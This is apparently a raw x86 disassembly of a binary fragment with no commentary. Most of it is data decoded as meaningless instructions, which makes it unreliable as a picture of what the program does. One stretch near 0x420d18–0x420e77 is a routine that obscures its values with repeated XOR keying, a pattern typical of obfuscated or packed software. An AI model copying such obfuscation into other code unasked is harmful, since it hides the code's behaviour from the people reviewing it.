  42075b:	cmp    DWORD PTR [edx+0x45e602c9],ebx
  420761:	xor    esp,DWORD PTR [ebp+0x7d9ed0a]
  420767:	adc    ebp,eax
  420769:	mov    edi,DWORD PTR [esi]
  42076b:	sti    
  42076c:	and    eax,0x8abe85e
  420771:	pop    es
  420772:	lock jnp 0x420755
  420775:	add    al,0xb2
  420777:	jb     0x4207eb
  420779:	ror    DWORD PTR [eax],0x4
  42077c:	inc    BYTE PTR [eax+0x52]
  42077f:	add    ecx,ebp
  420781:	in     eax,dx
  420782:	jae    0x42070d
  420784:	mov    ds:0x4839957c,al
  420789:	in     eax,dx
  42078a:	push   ecx
  42078b:	push   ebp
  42078c:	sub    eax,0x3f62b13b
  420791:	mov    eax,ds:0x69880126
  420796:	pop    ss
  420797:	mov    ecx,DWORD PTR [ebx-0x4b]
  42079a:	sub    BYTE PTR [esi-0x28e51162],al
  4207a0:	dec    edi
  4207a1:	add    bh,BYTE PTR [edx+0x0]
  4207a4:	sar    DWORD PTR [edx+0x17],1
  4207a7:	call   DWORD PTR [ecx+0x56]
  4207aa:	push   ds
  4207ab:	mov    dh,0x37
  4207ad:	mov    ds:0x3ad50a77,al
  4207b2:	jne    0x420822
  4207b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4207b5:	repnz and bh,dh
  4207b8:	stc    
  4207b9:	cmp    DWORD PTR [ebx],0xb90299af
  4207bf:	fmulp  st(6),st
  4207c1:	push   eax
  4207c2:	or     edx,DWORD PTR [ebp-0x4e]
  4207c5:	pusha  
  4207c6:	sub    dl,cl
  4207c8:	in     al,0xaf
  4207ca:	dec    esp
  4207cb:	call   0xa51b:0xc0622965
  4207d2:	xchg   edx,eax
  4207d3:	xor    eax,DWORD PTR [edx+eax*4]
  4207d6:	sub    DWORD PTR fs:[edx],ebx
  4207d9:	sub    ebp,DWORD PTR [esi-0x46]
  4207dc:	lgs    eax,FWORD PTR [edx-0x79]
  4207e0:	in     eax,dx
  4207e1:	jp     0x4207bb
  4207e3:	leave  
  4207e4:	cwde   
  4207e5:	sbb    DWORD PTR [ebp+0x471c7c12],esp
  4207eb:	add    ah,BYTE PTR [esi]
  4207ed:	sub    DWORD PTR [edx-0x48e7d570],0xffffffcb
  4207f4:	mov    ch,0x16
  4207f6:	dec    edi
  4207f7:	cld    
  4207f8:	fs xchg ebp,eax
  4207fa:	mov    dl,BYTE PTR es:[edx-0xd118191]
  420801:	pop    esi
  420802:	retf   0x8783
  420805:	imul   ebx,DWORD PTR [esi-0x15],0x60d22efb
  42080c:	mul    DWORD PTR ds:0xe4e88a5b
  420812:	addr16 repnz push ds
  420815:	jnp    0x420858
  420817:	jo     0x420808
  420819:	test   eax,0x5b056104
  42081e:	jle    0x4207ca
  420820:	push   edx
  420821:	sub    al,0xb8
  420823:	(bad)  
  420825:	fsubr  QWORD PTR [ebx-0x452e07b5]
  42082b:	add    edx,esp
  42082d:	stos   BYTE PTR es:[edi],al
  42082e:	test   eax,0x85b45f2d
  420833:	push   es
  420834:	or     cl,BYTE PTR [edi]
  420836:	mov    ds:0x13dbcbaa,al
  42083b:	or     al,0xc5
  42083d:	leave  
  42083e:	mov    ds:0x33147a50,al
  420843:	cmp    eax,0x25ae80b3
  420848:	retf   0x1e7d
  42084b:	ficom  DWORD PTR [ebx+ebp*1+0x17]
  42084f:	imul   ebp,DWORD PTR [esi+ebx*1+0xe],0xffffffba
  420854:	xchg   ebp,eax
  420855:	xor    DWORD PTR [esi-0x78],edx
  420858:	jecxz  0x420898
  42085a:	fnsave [ebp+0x38913e40]
  420860:	adc    al,0x24
  420862:	arpl   bx,dx
  420864:	jbe    0x4208c7
  420866:	or     DWORD PTR [ebx+ebx*8],esi
  420869:	pop    edx
  42086a:	pop    edx
  42086b:	jge    0x420820
  42086d:	bound  esi,QWORD PTR [ecx]
  42086f:	div    DWORD PTR [ebx]
  420871:	jp     0x420840
  420873:	(bad)  
  420874:	mov    ch,0x3b
  420876:	int3   
  420877:	cmp    DWORD PTR [edx-0x67],eax
  42087a:	xchg   esi,eax
  42087b:	pop    esp
  42087c:	imul   ebx,eax,0xffffff96
  42087f:	out    dx,eax
  420880:	shl    DWORD PTR [eax-0x5bc34c4d],1
  420886:	lods   al,BYTE PTR ds:[esi]
  420887:	mov    ecx,0x1cfd4183
  42088c:	mov    dh,0x34
  42088e:	mov    al,0x9a
  420890:	(bad)  
  420891:	pop    edx
  420892:	adc    BYTE PTR [ebx],al
  420894:	enter  0x454e,0x68
  420898:	repnz push cs
  42089a:	mov    ds:0x85d8b5f1,eax
  42089f:	mov    ah,0xd1
  4208a1:	fcomp  DWORD PTR ds:0xbce015f9
  4208a7:	push   edi
  4208a8:	test   eax,0x9f614b73
  4208ad:	xor    BYTE PTR [ebx+ebx*2],cl
  4208b0:	xchg   ebp,eax
  4208b1:	cli    
  4208b2:	or     BYTE PTR [edi-0x12],ch
  4208b5:	mov    eax,ds:0x3f4b7e8e
  4208ba:	jns    0x42091c
  4208bc:	in     al,0x1f
  4208be:	and    dl,0x9
  4208c1:	push   cs
  4208c2:	dec    edi
  4208c3:	add    edx,DWORD PTR [edx]
  4208c5:	add    ebp,DWORD PTR [esp+ecx*4-0x2c]
  4208c9:	aas    
  4208ca:	and    bl,BYTE PTR [edi-0x29044efd]
  4208d0:	retf   0x22c2
  4208d3:	xor    edi,DWORD PTR [ebp+0x17]
  4208d6:	jae    0x42086d
  4208d8:	call   0x49f4:0x735818b9
  4208df:	pop    ss
  4208e0:	dec    ecx
  4208e1:	sub    al,0xdd
  4208e3:	pop    ds
  4208e4:	jns    0x42088b
  4208e6:	jbe    0x420924
  4208e8:	stos   BYTE PTR es:[edi],al
  4208e9:	dec    ebx
  4208ea:	push   ds
  4208eb:	ja     0x4208b7
  4208ed:	ror    DWORD PTR [esi],cl
  4208ef:	sub    BYTE PTR [ebx-0x57],bl
  4208f2:	pusha  
  4208f3:	aad    0x19
  4208f5:	xor    al,BYTE PTR [eax+0x30]
  4208f8:	cwde   
  4208f9:	mov    BYTE PTR [ebx-0x41],dh
  4208fc:	dec    ebx
  4208fd:	test   DWORD PTR [ebx],edi
  4208ff:	cmp    DWORD PTR [eax+0xe],edx
  420902:	and    BYTE PTR ds:0x739b5cb3,bl
  420908:	ins    BYTE PTR es:[edi],dx
  420909:	daa    
  42090a:	inc    eax
  42090b:	ret    0x7d48
  42090e:	(bad)  
  42090f:	test   eax,0x6e713497
  420914:	cmp    edx,DWORD PTR [esi+0x2c5bb433]
  42091a:	xchg   edi,eax
  42091b:	jecxz  0x420977
  42091d:	call   0x7fc7:0x6d85d799
  420924:	sbb    esi,DWORD PTR [edx]
  420926:	test   eax,0xfb05d653
  42092b:	pop    ss
  42092c:	sti    
  42092d:	in     al,0x99
  42092f:	rcr    BYTE PTR [ebx],cl
  420931:	ret    0xeaa7
  420934:	cwde   
  420935:	xchg   edx,eax
  420936:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420937:	(bad)  
  420938:	fsubr  st,st(4)
  42093a:	and    eax,0xa9db61a5
  42093f:	xlat   BYTE PTR ds:[ebx]
  420940:	ins    DWORD PTR es:[edi],dx
  420941:	pop    es
  420942:	mov    eax,ds:0x7e706c35
  420947:	lock loop 0x420959
  42094a:	das    
  42094b:	cmp    dl,dh
  42094d:	enter  0x9d41,0xb7
  420951:	jl     0x4209c3
  420953:	outs   dx,DWORD PTR ds:[esi]
  420954:	dec    esp
  420955:	stos   DWORD PTR es:[edi],eax
  420956:	xor    edx,ebp
  420958:	int3   
  420959:	mov    WORD PTR [ebx+0x1a],?
  42095c:	rol    cl,0x46
  42095f:	cmp    ch,BYTE PTR [ebx+0x27]
  420962:	jo     0x420934
  420964:	inc    esi
  420965:	(bad)  
  420966:	push   ebp
  420967:	mov    esi,0x59bae3bc
  42096c:	call   0x879d068a
  420971:	cmp    ecx,esi
  420973:	test   al,0x21
  420975:	repnz sbb al,0xdd
  420978:	call   0x858fa989
  42097d:	xchg   esi,ecx
  42097f:	fld    st(1)
  420981:	lods   eax,DWORD PTR ds:[esi]
  420982:	jbe    0x42092e
  420984:	jge    0x4209bb
  420986:	popf   
  420987:	jecxz  0x42097a
  420989:	cmp    BYTE PTR [eax],dh
  42098b:	mov    BYTE PTR [ebp+0xf],dl
  42098e:	add    ah,BYTE PTR [esi]
  420990:	or     eax,0x14d27524
  420995:	in     al,0x21
  420997:	mov    esi,0xf871c4df
  42099c:	fcomp  DWORD PTR [eax]
  42099e:	dec    eax
  42099f:	mov    ebx,0x225a3fa3
  4209a4:	pop    edx
  4209a5:	lds    ebx,FWORD PTR [edi+0x4e]
  4209a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4209a9:	cmp    DWORD PTR [edx+0x36280768],ecx
  4209af:	mov    dl,0x80
  4209b1:	jne    0x420a0b
  4209b3:	sbb    ah,BYTE PTR [eax]
  4209b5:	jbe    0x4209b7
  4209b7:	mov    eax,0xe22d0d7a
  4209bc:	pop    ss
  4209bd:	pop    ebx
  4209be:	(bad)  
  4209bf:	in     al,dx
  4209c0:	nop
  4209c1:	das    
  4209c2:	repnz int 0x11
  4209c5:	pop    ecx
  4209c6:	fadd   DWORD PTR [edi-0x17982b93]
  4209cc:	push   ecx
  4209cd:	jge    0x420a0b
  4209cf:	daa    
  4209d0:	es idiv esp
  4209d3:	xor    DWORD PTR [edx+esi*1],ebx
  4209d6:	sub    bh,BYTE PTR [ebx+0x5]
  4209d9:	dec    esi
  4209da:	je     0x42099c
  4209dc:	push   ss
  4209dd:	call   DWORD PTR [ecx+0x28eece60]
  4209e3:	dec    ebx
  4209e4:	jae    0x420a29
  4209e6:	mov    ch,0xb1
  4209e8:	ins    BYTE PTR es:[edi],dx
  4209e9:	repnz add DWORD PTR [ebp+eiz*4+0x3a50f22b],ebp
  4209f1:	add    DWORD PTR [ebx-0x48],esi
  4209f4:	pop    ebx
  4209f5:	sbb    cl,dl
  4209f7:	out    0xf1,al
  4209f9:	in     eax,0xb
  4209fb:	dec    ecx
  4209fc:	sbb    BYTE PTR [edx+0x46],0x3d
  420a00:	mov    dl,0x2c
  420a02:	mul    DWORD PTR [edx]
  420a04:	jmp    0x6b2688f9
  420a09:	sbb    DWORD PTR [ecx-0x49f0230b],eax
  420a0f:	mov    ebx,DWORD PTR [ebx+eiz*2]
  420a12:	mov    edi,0x80de6e1a
  420a17:	in     eax,0x8
  420a19:	pop    ecx
  420a1a:	repz rcr al,0x6e
  420a1e:	div    ah
  420a20:	fsub   DWORD PTR ds:0xe16489e3
  420a26:	mov    ah,0x7d
  420a28:	stos   DWORD PTR es:[edi],eax
  420a29:	xchg   eax,ecx
  420a2b:	pop    ebx
  420a2c:	or     al,0xc3
  420a2e:	repnz push ds
  420a30:	rcl    DWORD PTR [ebx],0xa
  420a33:	sub    BYTE PTR [ebp+0x1a],0xed
  420a37:	imul   eax,DWORD PTR [ecx],0x59eb6937
  420a3d:	(bad)  
  420a3f:	jb     0x420a8b
  420a41:	add    BYTE PTR [ecx+0x6a],0x1f
  420a45:	fldenv [esi-0x39919de9]
  420a4b:	cmp    DWORD PTR [esi+0x5a],ebp
  420a4e:	cmc    
  420a4f:	pop    edx
  420a50:	xchg   DWORD PTR [ebx-0xd],ebp
  420a53:	jb     0x4209eb
  420a55:	jne    0x420a05
  420a57:	fmul   st,st(0)
  420a59:	int    0xb2
  420a5b:	and    al,0x16
  420a5d:	dec    edi
  420a5e:	mov    eax,ds:0xfe30c30c
  420a63:	mov    ah,0xf0
  420a65:	addr16 sti 
  420a67:	aad    0x62
  420a69:	sbb    BYTE PTR [ecx+0x73],ch
  420a6c:	lds    eax,FWORD PTR [ebx+0x3eaade02]
  420a72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a73:	lods   eax,DWORD PTR ds:[esi]
  420a74:	mov    ebp,0x676e74ea
  420a79:	inc    eax
  420a7a:	cmp    dl,BYTE PTR [ecx+0x297f7022]
  420a80:	loopne 0x420acc
  420a82:	sbb    bh,BYTE PTR [edx]
  420a84:	dec    dx
  420a86:	popa   
  420a87:	push   ebp
  420a88:	repnz adc BYTE PTR [eax+0x53],0xf4
  420a8d:	repnz mov edx,0x4c34605f
  420a93:	pop    edi
  420a94:	pop    esi
  420a95:	inc    edi
  420a96:	jmp    0xce63:0x8b66fd00
  420a9d:	gs pop ebx
  420a9f:	bound  ecx,QWORD PTR [eax]
  420aa1:	stos   DWORD PTR es:[edi],eax
  420aa2:	jne    0x420a5a
  420aa4:	inc    edx
  420aa5:	jae    0x420b1a
  420aa7:	iret   
  420aa8:	stos   BYTE PTR es:[edi],al
  420aa9:	icebp  
  420aaa:	or     al,0x3
  420aac:	cs je  0x420a3d
  420aaf:	cmp    BYTE PTR [edx-0x5b],al
  420ab2:	mov    bh,0x10
  420ab4:	frstor [edx]
  420ab6:	dec    ebp
  420ab7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ab8:	outs   dx,DWORD PTR ds:[esi]
  420ab9:	inc    edx
  420aba:	jg     0x420ace
  420abc:	cmp    al,0x73
  420abe:	xchg   DWORD PTR [eax+0x23],eax
  420ac1:	call   0x9883e3be
  420ac6:	mov    ch,0xf7
  420ac8:	xchg   BYTE PTR [esi],al
  420aca:	adc    edi,DWORD PTR [esi+0x52]
  420acd:	popa   
  420ace:	mov    eax,0x52cb0c9
  420ad3:	dec    ebp
  420ad4:	add    BYTE PTR [edi],bl
  420ad6:	dec    edx
  420ad7:	fs jmp 0xc3b83c50
  420add:	mov    ebx,0xa9311153
  420ae2:	mov    ch,0x88
  420ae4:	and    edi,DWORD PTR [esi]
  420ae6:	gs xchg ebp,eax
  420ae8:	or     BYTE PTR [edi-0x76],0xde
  420aec:	in     eax,dx
  420aed:	mov    BYTE PTR [ebp-0x4804dd14],al
  420af3:	lds    eax,FWORD PTR [ebx-0x2bdba1b5]
  420af9:	jo     0x420b42
  420afb:	dec    ecx
  420afc:	inc    ebp
  420afd:	sub    BYTE PTR [edx+0x704b0268],dl
  420b03:	dec    esi
  420b04:	or     DWORD PTR [ebx],esp
  420b06:	and    eax,0x640094fd
  420b0b:	inc    edx
  420b0d:	or     eax,0xa2654f0c
  420b12:	rcl    BYTE PTR [edi],cl
  420b14:	(bad)  
  420b15:	stos   DWORD PTR es:[edi],eax
  420b16:	es push cs
  420b18:	pop    esp
  420b19:	call   0xa7dc:0xc5c959d4
  420b20:	mov    ch,0xa9
  420b22:	mov    ebp,0x1cd4a977
  420b27:	or     BYTE PTR [eax+0x149c6f06],0x78
  420b2e:	ret    0x6681
  420b31:	out    dx,al
  420b32:	jge    0x420af4
  420b34:	sub    eax,0xb4bf5b3
  420b39:	xchg   ebp,eax
  420b3a:	fwait
  420b3b:	lahf   
  420b3c:	stos   DWORD PTR es:[edi],eax
  420b3d:	dec    ecx
  420b3e:	(bad)  
  420b3f:	push   esi
  420b40:	arpl   WORD PTR [esi-0x4d],di
  420b43:	inc    edx
  420b44:	scas   al,BYTE PTR es:[edi]
  420b45:	fadd   DWORD PTR [edi-0x5b]
  420b48:	retf   
  420b49:	xor    al,BYTE PTR [edi+ebp*4]
  420b4c:	add    BYTE PTR [ebx],dl
  420b4e:	jb     0x420b9f
  420b50:	sbb    eax,0x87657167
  420b55:	jle    0x420ae0
  420b57:	stc    
  420b58:	mov    WORD PTR [ebx+0x2d],?
  420b5b:	sub    eax,0x153a8744
  420b60:	(bad)  
  420b61:	mov    esp,0xa014bf3b
  420b66:	cmp    eax,0xf832cd84
  420b6b:	jmp    0x420bd5
  420b6d:	cli    
  420b6e:	cld    
  420b6f:	xlat   BYTE PTR ds:[ebx]
  420b70:	push   0xce9f8240
  420b75:	fs stos DWORD PTR es:[edi],eax
  420b77:	cmp    al,0xd6
  420b79:	mov    ds,WORD PTR [ebx]
  420b7b:	cmp    DWORD PTR [ebx+0x7c7d184a],ebp
  420b81:	loopne 0x420bb5
  420b83:	(bad)  
  420b84:	daa    
  420b85:	dec    esi
  420b86:	mov    edi,0x197f9bf8
  420b8b:	gs dec esi
  420b8d:	xchg   ecx,eax
  420b8e:	fbstp  TBYTE PTR [edi-0x46]
  420b91:	(bad)  
  420b92:	gs cmc 
  420b94:	pop    edi
  420b95:	mov    edi,0x3bae4261
  420b9a:	jne    0x420c1a
  420b9c:	mov    edx,0x9f8eb5ce
  420ba1:	mov    dl,0x14
  420ba3:	or     eax,0xc3877d9e
  420ba8:	jmp    0x21d8:0xbb723df4
  420baf:	out    dx,al
  420bb0:	outs   dx,DWORD PTR ds:[esi]
  420bb1:	adc    DWORD PTR [edx-0x7b],0xd96258e3
  420bb8:	mov    cl,0xaa
  420bba:	pop    ss
  420bbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420bbc:	cmp    DWORD PTR [ecx],0xffffff8a
  420bbf:	ret    
  420bc0:	mov    dl,BYTE PTR [eax+0x4900fbf0]
  420bc6:	not    DWORD PTR [ebx-0x7ec96310]
  420bcc:	ins    BYTE PTR es:[edi],dx
  420bcd:	pop    eax
  420bce:	adc    bh,al
  420bd0:	pop    es
  420bd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420bd2:	add    cl,BYTE PTR [ecx]
  420bd4:	daa    
  420bd5:	cdq    
  420bd6:	cs pop eax
  420bd8:	mov    al,ds:0x464375e3
  420bdd:	hlt    
  420bde:	sahf   
  420bdf:	movhps QWORD PTR [ecx],xmm2
  420be2:	pop    ebp
  420be3:	loopne 0x420ba4
  420be5:	or     eax,0xfd8e8740
  420bea:	js     0x420c5c
  420bec:	sub    al,0xb8
  420bee:	and    ch,BYTE PTR [ecx+esi*4-0x27]
  420bf2:	pop    es
  420bf3:	jnp    0x420b7d
  420bf5:	mov    ah,0xf7
  420bf7:	das    
  420bf8:	or     ecx,ecx
  420bfa:	ja     0x420bc3
  420bfc:	out    0x84,al
  420bfe:	jecxz  0x420b9f
  420c00:	and    eax,0xada24a26
  420c05:	loope  0x420c54
  420c07:	or     BYTE PTR [ebx-0x8],al
  420c0a:	mov    DWORD PTR [ecx+ebp*2+0x6cb63f74],ebx
  420c11:	mov    ebp,0xcb84bf5d
  420c16:	ins    DWORD PTR es:[edi],dx
  420c17:	dec    esp
  420c18:	pop    ebp
  420c19:	xor    ebp,DWORD PTR [ebp+0xd9977d3]
  420c1f:	mov    dh,0xc5
  420c21:	xchg   ebx,eax
  420c22:	jbe    0x420c12
  420c24:	dec    eax
  420c25:	out    dx,eax
  420c26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c27:	pop    ebp
  420c28:	add    esi,DWORD PTR [eax-0x1005d75e]
  420c2e:	mov    edi,0x9bc5705c
  420c33:	pop    edi
  420c34:	add    BYTE PTR [ecx-0x6c],bh
  420c37:	pusha  
  420c38:	test   al,0xa1
  420c3a:	jne    0x420bcf
  420c3c:	push   edi
  420c3d:	(bad)  
  420c3e:	adc    eax,0xd9105757
  420c43:	sub    DWORD PTR [edi],edx
  420c45:	das    
  420c46:	test   BYTE PTR [edx*2-0xd159302],ah
  420c4d:	in     al,0x21
  420c4f:	dec    BYTE PTR ds:0xfc905fdd
  420c55:	sti    
  420c56:	add    edi,DWORD PTR [esi+0x5e]
  420c59:	or     BYTE PTR [esi+0x2ac912f4],cl
  420c5f:	pusha  
  420c60:	jns    0x420c48
  420c62:	loop   0x420c8f
  420c64:	jmp    0x4564ee58
  420c69:	xor    al,0xbe
  420c6b:	repz fidiv WORD PTR [eax+0x22]
  420c6f:	test   eax,0x750fa839
  420c74:	fmul   QWORD PTR [eax]
  420c76:	outs   dx,BYTE PTR ds:[esi]
  420c77:	adc    ecx,eax
  420c79:	ja     0x420c25
  420c7b:	sub    al,0x16
  420c7d:	dec    edx
  420c7e:	imul   esp,edx,0xcfe4d45b
  420c84:	sub    eax,0xedec3df0
  420c89:	ins    BYTE PTR es:[edi],dx
  420c8a:	or     al,0xd0
  420c8c:	cmp    eax,0x8b1a64f5
  420c91:	les    ebp,FWORD PTR [edi-0x5d340a74]
  420c97:	cwde   
  420c98:	int3   
  420c99:	ds out 0x2b,eax
  420c9c:	cmp    ch,0x64
  420c9f:	ss enter 0xeb77,0xf0
  420ca4:	adc    DWORD PTR [ecx-0x3],0xffffffc1
  420ca8:	shr    BYTE PTR [esi+0x40ba59f9],cl
  420cae:	(bad)  
  420cb0:	ret    
  420cb1:	pop    eax
  420cb2:	pop    ds
  420cb3:	ins    DWORD PTR es:[edi],dx
  420cb4:	test   eax,0x9fdfb6fe
  420cba:	jmp    0x7dd:0x9ffd5026
  420cc1:	mov    esi,0x5dc22c79
  420cc6:	daa    
  420cc7:	sub    DWORD PTR [edx+ebx*1+0x31b1ff1f],esi
  420cce:	mov    cl,0x15
  420cd0:	sbb    dl,BYTE PTR [ebx-0x1a]
  420cd3:	shr    ecx,1
  420cd5:	inc    BYTE PTR [ebx]
  420cd7:	adc    DWORD PTR [ecx],esp
  420cd9:	aas    
  420cda:	test   al,0x29
  420cdc:	sub    al,0xf4
  420cde:	sub    DWORD PTR [edx],edi
  420ce0:	pop    esp
  420ce1:	lods   al,BYTE PTR ds:[esi]
  420ce2:	call   0xe47136ef
  420ce7:	pop    edx
  420ce8:	(bad)  
  420cea:	ret    0xff55
  420ced:	adc    bl,al
  420cef:	mov    ds:0x79c0fde6,eax
  420cf4:	pusha  
  420cf5:	jno    0x420d74
  420cf7:	inc    edi
  420cf8:	adc    al,0xf
  420cfa:	dec    ebx
  420cfb:	mov    eax,ds:0xcc06fc6b
  420d00:	cmc    
  420d01:	jmp    0x8b7a:0x8929f114
  420d08:	jno    0x420d67
  420d0a:	sub    BYTE PTR [esi+esi*8],0x30
  420d0e:	pushf  
  420d0f:	xchg   edi,eax
  420d10:	pop    edi
  420d11:	or     ebp,DWORD PTR [ecx+ebp*1-0x4f]
  420d15:	dec    esp
  420d16:	xor    edi,ebx
  420d18:	mov    DWORD PTR [edx],edi
  420d1a:	mov    edx,DWORD PTR [ebp+0x8]
  420d1d:	xor    edx,eax
  420d1f:	inc    ecx
  420d20:	inc    DWORD PTR [ebp-0x18]
  420d23:	add    edx,esi
  420d25:	cmp    ecx,edx
  420d27:	jb     0x41e963
  420d2d:	jmp    0x420d77
  420d32:	mov    ecx,DWORD PTR [ebp-0xc]
  420d35:	mov    DWORD PTR [ebp+0x8],ecx
  420d38:	jmp    0x420d6a
  420d3d:	mov    ecx,DWORD PTR [ebp+0x8]
  420d40:	mov    edx,DWORD PTR [ebp-0x8]
  420d43:	xor    ecx,eax
  420d45:	xor    edx,eax
  420d47:	sub    ecx,edx
  420d49:	sub    ecx,esi
  420d4b:	xor    ecx,eax
  420d4d:	mov    DWORD PTR [ebp+0x8],ecx
  420d50:	mov    ecx,DWORD PTR [ebp+0x8]
  420d53:	mov    edx,DWORD PTR [ebp+0x8]
  420d56:	imul   edx,edx,0x5708f2
  420d5c:	xor    ecx,eax
  420d5e:	add    ecx,esi
  420d60:	lea    ecx,[ebp+ecx*4-0x64]
  420d64:	mov    edi,DWORD PTR [ecx]
  420d66:	add    edx,edi
  420d68:	mov    DWORD PTR [ecx],edx
  420d6a:	mov    ecx,DWORD PTR [ebp+0x8]
  420d6d:	xor    ecx,eax
  420d6f:	add    ecx,esi
  420d71:	jne    0x420d3d
  420d77:	mov    ecx,DWORD PTR [ebp-0xc]
  420d7a:	mov    DWORD PTR [ebp+0x8],ecx
  420d7d:	jmp    0x420daf
  420d82:	mov    ecx,DWORD PTR [ebp+0x8]
  420d85:	mov    edx,DWORD PTR [ebp-0x8]
  420d88:	xor    ecx,eax
  420d8a:	xor    edx,eax
  420d8c:	sub    ecx,edx
  420d8e:	sub    ecx,esi
  420d90:	xor    ecx,eax
  420d92:	mov    DWORD PTR [ebp+0x8],ecx
  420d95:	mov    ecx,DWORD PTR [ebp+0x8]
  420d98:	mov    edx,DWORD PTR [ebp+0x8]
  420d9b:	imul   edx,edx,0x5708f2
  420da1:	xor    ecx,eax
  420da3:	add    ecx,esi
  420da5:	lea    ecx,[ebp+ecx*4-0x64]
  420da9:	mov    edi,DWORD PTR [ecx]
  420dab:	add    edx,edi
  420dad:	mov    DWORD PTR [ecx],edx
  420daf:	mov    ecx,DWORD PTR [ebp+0x8]
  420db2:	xor    ecx,eax
  420db4:	add    ecx,esi
  420db6:	jne    0x420d82
  420dbc:	mov    ecx,DWORD PTR [ebp-0x8]
  420dbf:	mov    edx,DWORD PTR [ebp-0x20]
  420dc2:	xor    ecx,eax
  420dc4:	lea    ecx,[ecx+edx*1+0x3272dd]
  420dcb:	mov    DWORD PTR [ebp-0x20],ecx
  420dce:	inc    DWORD PTR [ebp+0xc]
  420dd1:	mov    ecx,DWORD PTR [ebp-0x1c]
  420dd4:	xor    ecx,eax
  420dd6:	add    ecx,esi
  420dd8:	jne    0x413678
  420dde:	jmp    0x420e67
  420de3:	mov    ecx,DWORD PTR [ebp-0xc]
  420de6:	mov    DWORD PTR [ebp+0x8],ecx
  420de9:	jmp    0x420e1b
  420dee:	mov    ecx,DWORD PTR [ebp+0x8]
  420df1:	mov    edx,DWORD PTR [ebp-0x8]
  420df4:	xor    ecx,eax
  420df6:	xor    edx,eax
  420df8:	sub    ecx,edx
  420dfa:	sub    ecx,esi
  420dfc:	xor    ecx,eax
  420dfe:	mov    DWORD PTR [ebp+0x8],ecx
  420e01:	mov    ecx,DWORD PTR [ebp+0x8]
  420e04:	mov    edx,DWORD PTR [ebp+0x8]
  420e07:	imul   edx,edx,0x5708f2
  420e0d:	xor    ecx,eax
  420e0f:	add    ecx,esi
  420e11:	lea    ecx,[ebp+ecx*4-0x64]
  420e15:	mov    edi,DWORD PTR [ecx]
  420e17:	add    edx,edi
  420e19:	mov    DWORD PTR [ecx],edx
  420e1b:	mov    ecx,DWORD PTR [ebp+0x8]
  420e1e:	xor    ecx,eax
  420e20:	add    ecx,esi
  420e22:	jne    0x420dee
  420e28:	jmp    0x420e73
  420e2d:	mov    ecx,DWORD PTR [ebp+0x8]
  420e30:	mov    edx,DWORD PTR [ebp-0x8]
  420e33:	xor    ecx,eax
  420e35:	xor    edx,eax
  420e37:	sub    ecx,edx
  420e39:	sub    ecx,esi
  420e3b:	xor    ecx,eax
  420e3d:	mov    DWORD PTR [ebp+0x8],ecx
  420e40:	mov    ecx,DWORD PTR [ebp+0x8]
  420e43:	mov    edx,DWORD PTR [ebp+0x8]
  420e46:	xor    ecx,eax
  420e48:	imul   edx,edx,0x5708f2
  420e4e:	add    ecx,esi
  420e50:	lea    ecx,[ebp+ecx*4-0x64]
  420e54:	mov    edi,DWORD PTR [ecx]
  420e56:	add    edx,edi
  420e58:	mov    DWORD PTR [ecx],edx
  420e5a:	mov    ecx,DWORD PTR [ebp+0x8]
  420e5d:	xor    ecx,eax
  420e5f:	add    ecx,esi
  420e61:	jne    0x420e2d
  420e67:	mov    ecx,DWORD PTR [ebp-0x8]
  420e6a:	xor    ecx,eax
  420e6c:	mov    eax,DWORD PTR [ebp+0x10]
  420e6f:	add    ecx,esi
  420e71:	mov    DWORD PTR [eax],ecx
  420e73:	pop    edi
  420e74:	pop    esi
  420e75:	pop    ebx
  420e76:	leave  
  420e77:	ret    0xc
  420e7a:	dec    ebp
  420e7b:	and    eax,0x55210010
  420e80:	adc    BYTE PTR [eax],al
  420e82:	call   DWORD PTR [ebp+0x10]
  420e85:	add    bh,al
  420e87:	adc    BYTE PTR ss:[eax],al
  420e8a:	cld    
  420e8b:	ins    BYTE PTR es:[edi],dx
  420e8c:	adc    BYTE PTR [eax],al
  420e8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e8f:	js     0x420ea1
  420e91:	add    BYTE PTR [ebx+eiz*2],al
  420e94:	adc    BYTE PTR [eax],al
  420e96:	dec    edi
  420e97:	jae    0x420ea9
  420e99:	add    ah,bl
  420e9b:	sub    eax,0x6ed60010
  420ea0:	adc    BYTE PTR [eax],al
  420ea2:	cmp    BYTE PTR [ecx],al
  420ea4:	adc    BYTE PTR [eax],al
  420ea6:	cwde   
  420ea7:	cmovb  eax,DWORD PTR [eax]
  420eaa:	pushf  
  420eab:	cmovb  eax,DWORD PTR [eax]
  420eae:	mov    al,ds:0xa400420f
  420eb3:	cmovb  eax,DWORD PTR [eax]
  420eb6:	test   al,0xf
  420eb8:	inc    edx
  420eb9:	add    BYTE PTR [edi+ecx*1+0xfb00042],ch
  420ec0:	inc    edx
  420ec1:	add    BYTE PTR [edi+ecx*1+0x42],dh
	...
  420ed4:	dec    edx
  420ed5:	aam    0xb3
  420ed7:	dec    ebp
  420ed8:	add    BYTE PTR [eax],al
  420eda:	add    BYTE PTR [eax],al
  420edc:	add    al,BYTE PTR [eax]
  420ede:	add    BYTE PTR [eax],al
  420ee0:	cmp    eax,0xc0000000
  420ee5:	lar    eax,WORD PTR [eax]
  420ee8:	rol    BYTE PTR [ebx],0x2
  420eeb:	add    BYTE PTR [edx+0xe],al
  420eee:	adc    BYTE PTR [eax],al
  420ef0:	pop    esp
  420ef1:	sbb    edx,DWORD PTR [eax]
  420ef3:	add    BYTE PTR [ebx-0x4dffefb0],cl
  420ef9:	sub    eax,0x29930010
  420efe:	adc    BYTE PTR [eax],al
  420f00:	mov    al,ds:0x5900101f
  420f05:	push   ebp
  420f06:	adc    BYTE PTR [eax],al
  420f08:	ret    0x102d
  420f0b:	add    BYTE PTR [edx+0xe],bh
  420f0e:	inc    edx
  420f0f:	add    BYTE PTR [esi+0xe],bh
  420f12:	inc    edx
  420f13:	add    BYTE PTR [edx-0x79ffbdf2],al
  420f19:	push   cs
  420f1a:	inc    edx
  420f1b:	add    BYTE PTR [edx-0x71ffbdf2],cl
  420f21:	push   cs
  420f22:	inc    edx
